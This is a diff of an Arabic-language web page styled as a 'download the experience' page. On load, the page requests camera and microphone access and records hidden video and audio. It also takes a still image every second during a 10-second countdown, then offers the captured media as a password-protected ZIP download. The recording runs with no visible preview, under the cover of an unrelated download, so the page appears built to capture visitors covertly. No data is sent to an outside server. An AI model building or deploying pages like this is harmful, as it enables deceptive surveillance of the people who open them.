@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تحميل التجربة</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@zip.js/zip.js@2.7.22/dist/zip-full.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -11,11 +13,9 @@
             background-color: #f0f8ff;
             padding-top: 50px;
         }
-
         h1 {
             color: #4CAF50;
         }
-
         .download-button {
             margin-top: 20px;
             background-color: #007bff;
@@ -25,13 +25,11 @@
             color: white;
             border: none;
             border-radius: 5px;
-            opacity: 0.5; /* تعطيل الزر بشكل افتراضي */
+            opacity: 0.5;
         }
-
         .download-button.enabled {
-            opacity: 1; /* تفعيل الزر بعد التقاط الصور */
+            opacity: 1;
         }
-
         .countdown {
             font-size: 20px;
             margin-top: 20px;
@@ -42,126 +40,87 @@
 <body>
 
 <h1>تحميل التجربة</h1>
-
-<!-- عداد العد التنازلي -->
 <p id="countdown" class="countdown">الوقت المتبقي: <span id="time">10</span> ثانية</p>
-
 <button id="downloadButton" class="download-button" onclick="downloadExperience()" disabled>تنزيل التجربة</button>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
-
 <script>
-    let countdownTime = 10; // عدد الثواني التي ستتناقص
+    let countdownTime = 10;
     let countdownInterval;
-    let capturedImages = []; // مصفوفة لتخزين الصور الملتقطة
-    const maxImages = 20; // عدد الصور المطلوبة لتمكين زر التحميل
+    let capturedImages = [];
     let cameraStream;
     let mediaRecorder;
-    let recordedChunks = []; // لتخزين أجزاء الفيديو المسجل
-    const videoElement = document.createElement('video'); // عنصر فيديو لتسجيل الصوت والفيديو
-    let startRecordingTime = Date.now();
-
-    // بدء العد التنازلي
-    function startCountdown() {
-        countdownInterval = setInterval(function() {
-            countdownTime--; // تقليل الوقت
-            document.getElementById('time').textContent = countdownTime; // تحديث الوقت في الصفحة
-            if (countdownTime <= 0) {
-                clearInterval(countdownInterval); // إيقاف العد التنازلي
-                stopCamera(); // إيقاف الكاميرا بعد انتهاء العد
-                enableDownloadButton(); // تمكين زر التحميل بعد انتهاء التقاط الصور
-            } else {
-                captureImage(); // التقاط صورة كل ثانية
-            }
-        }, 1000); // العد التنازلي كل ثانية
-    }
-
-    // بدء الكاميرا لالتقاط الصور بدون عرض الفيديو
+    let recordedChunks = [];
+    const videoElement = document.createElement('video');
+    
     async function startCamera() {
         try {
-            const constraints = {
-                video: { facingMode: "user" },
-                audio: true
-            };
-            cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+            cameraStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             videoElement.srcObject = cameraStream;
-            videoElement.play(); // تشغيل الفيديو في الخلفية
+            videoElement.play();
             mediaRecorder = new MediaRecorder(cameraStream);
-            mediaRecorder.ondataavailable = handleDataAvailable;
+            mediaRecorder.ondataavailable = event => recordedChunks.push(event.data);
             mediaRecorder.start();
         } catch (error) {
             alert("لم نتمكن من الوصول إلى الكاميرا أو الميكروفون. يرجى التأكد من منح الأذونات.");
         }
     }
 
-    // التعامل مع البيانات المتاحة لتسجيل الفيديو
-    function handleDataAvailable(event) {
-        if (event.data.size > 0) {
-            recordedChunks.push(event.data);
-        }
+    function startCountdown() {
+        countdownInterval = setInterval(() => {
+            countdownTime--;
+            document.getElementById('time').textContent = countdownTime;
+            if (countdownTime <= 0) {
+                clearInterval(countdownInterval);
+                stopCamera();
+                enableDownloadButton();
+            } else {
+                captureImage();
+            }
+        }, 1000);
     }
 
-    // إيقاف الكاميرا والتسجيل
-    function stopCamera() {
-        mediaRecorder.stop();
-        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-        const videoUrl = URL.createObjectURL(videoBlob);
-        capturedImages.push(videoUrl); // إضافة الفيديو إلى الأرشيف
-        // إيقاف تدفق الكاميرا
-        cameraStream.getTracks().forEach(track => track.stop());
-    }
-
-    // التقاط صورة
     function captureImage() {
-        const canvas = document.createElement('canvas'); // إنشاء عنصر canvas
-        const video = document.querySelector('video'); // العثور على الفيديو المخفي
+        const canvas = document.createElement('canvas');
+        const video = videoElement;
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         const context = canvas.getContext('2d');
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageData = canvas.toDataURL('image/png'); // الحصول على الصورة بتنسيق Base64
-
-        // إضافة الصورة إلى المصفوفة
-        capturedImages.push(imageData);
-
-        // إذا تم التقاط عدد الصور المطلوب، تفعيل زر التحميل
-        if (capturedImages.length >= maxImages) {
-            enableDownloadButton();
-        }
+        canvas.toBlob(blob => capturedImages.push(blob), 'image/png');
     }
 
-    // تفعيل زر التحميل بعد التقاط عدد الصور
+    function stopCamera() {
+        mediaRecorder.stop();
+        mediaRecorder.onstop = () => {
+            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+            capturedImages.push(videoBlob);
+            cameraStream.getTracks().forEach(track => track.stop());
+        };
+    }
+
     function enableDownloadButton() {
-        if (capturedImages.length >= maxImages) {
-            document.getElementById('downloadButton').disabled = false; // تمكين الزر
-            document.getElementById('downloadButton').classList.add('enabled'); // إضافة فصل CSS لتغيير الشكل
-        }
+        document.getElementById('downloadButton').disabled = false;
+        document.getElementById('downloadButton').classList.add('enabled');
     }
 
-    // تحميل الأرشيف عند الضغط على زر "تنزيل التجربة"
     async function downloadExperience() {
-        const zip = new JSZip(); // إنشاء أرشيف جديد
-        const folder = zip.folder("experience"); // إنشاء مجلد داخل الأرشيف
-
-        // إضافة الصور والفيديو إلى الأرشيف
+        const zipWriter = new zip.ZipWriter(new zip.BlobWriter("application/zip"), { password: "2010 2010" });
         for (let i = 0; i < capturedImages.length; i++) {
-            const fileName = i < maxImages ? `image${i + 1}.png` : `video.webm`; // تسمية الملفات
-            const fileData = capturedImages[i].split(",")[1]; // فصل البيانات عن نوع الصورة/الفيديو
-            folder.file(fileName, fileData, { base64: true });
+            const fileName = i < capturedImages.length - 1 ? `image${i + 1}.png` : `video.webm`;
+            await zipWriter.add(fileName, new zip.BlobReader(capturedImages[i]));
         }
-
-        // إنشاء الأرشيف وتحميله
-        const content = await zip.generateAsync({ type: "blob" });
-        const link = document.createElement('a');
-        link.href = URL.createObjectURL(content);
-        link.download = "experience.zip"; // اسم الأرشيف الذي سيتم تحميله
+        const zipBlob = await zipWriter.close();
+        const link = document.createElement("a");
+        link.href = URL.createObjectURL(zipBlob);
+        link.download = "test.zip";
+        document.body.appendChild(link);
         link.click();
+        document.body.removeChild(link);
     }
 
-    // بدء الكاميرا والعد التنازلي عند تحميل الصفحة
     window.onload = function() {
-        startCamera(); // بدء الكاميرا وطلب الإذن
-        startCountdown(); // بدء العد التنازلي
+        startCamera();
+        startCountdown();
     };
 </script>
 
